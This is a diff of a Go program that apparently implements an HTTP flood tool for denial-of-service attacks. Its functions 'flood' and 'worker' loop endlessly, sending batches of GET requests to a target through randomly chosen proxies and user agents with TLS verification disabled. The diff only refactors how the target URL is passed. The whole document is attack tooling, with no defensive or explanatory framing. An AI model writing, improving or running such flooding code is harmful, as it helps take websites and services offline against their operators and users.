@@ -5,7 +5,6 @@ import (
 	"crypto/tls"
 	"math/rand"
 	"net/http"
-	"net/url"
 	"os"
 	"os/exec"
 	"time"
@@ -41,8 +40,8 @@ func readLines(fileName string) []string {
 	return lines
 }
 
-func flood(u *url.URL, useragent, proxy string, n int) {
-	req, err := http.NewRequest("GET", u.String(), nil)
+func flood(url string, useragent, proxy string, n int) {
+	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
 		return
 	}
@@ -56,14 +55,14 @@ func flood(u *url.URL, useragent, proxy string, n int) {
 		return
 	}
 
-	conn, err := dialer.DialTimeout("tcp", u.Host, 5*time.Second)
+	conn, err := dialer.DialTimeout("tcp", req.URL.Host, 5*time.Second)
 	if err != nil {
 		return
 	}
 
-	if u.Scheme == "https" {
+	if req.URL.Scheme == "https" {
 		conn = tls.Client(conn, &tls.Config{
-			ServerName:         u.Hostname(),
+			ServerName:         req.URL.Hostname(),
 			InsecureSkipVerify: true,
 		})
 	}
@@ -74,9 +73,9 @@ func flood(u *url.URL, useragent, proxy string, n int) {
 	}
 }
 
-func worker(u *url.URL, useragents, proxies []string) {
+func worker(url string, useragents, proxies []string) {
 	for {
-		flood(u, random(useragents), random(proxies), 100)
+		flood(url, random(useragents), random(proxies), 100)
 	}
 }
 
